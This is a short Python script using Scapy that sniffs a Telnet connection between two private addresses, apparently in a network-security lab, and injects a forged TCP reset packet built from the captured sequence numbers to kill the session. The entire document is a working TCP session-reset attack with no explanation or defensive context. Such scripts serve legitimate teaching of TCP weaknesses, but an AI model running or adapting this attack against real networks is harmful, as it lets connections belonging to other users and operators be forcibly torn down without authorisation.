#!/usr/bin/env python3
from scapy.all import IP, TCP, sniff, send, conf

CLIENT = "10.9.0.6"
SERVER = "10.9.0.5"
iface = conf.route.route(SERVER)[0]

def is_client_ack(pkt):
    return TCP in pkt and bool(pkt[TCP].flags & 0x10) and len(pkt[TCP].payload) == 0

def send_reset(pkt):
    rst = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(
        sport=pkt[TCP].dport,
        dport=pkt[TCP].sport,
        flags="R",
        seq=pkt[TCP].ack,
    )
    send(rst, verbose=0)
    print(f"RST sent on {iface}: seq={pkt[TCP].ack}")

print(f"Waiting for a Telnet ACK on {iface}...")
sniff(
    iface=iface,
    filter=f"tcp and src host {CLIENT} and dst host {SERVER} and dst port 23",
    lfilter=is_client_ack,
    prn=send_reset,
    count=1,
    store=False,
)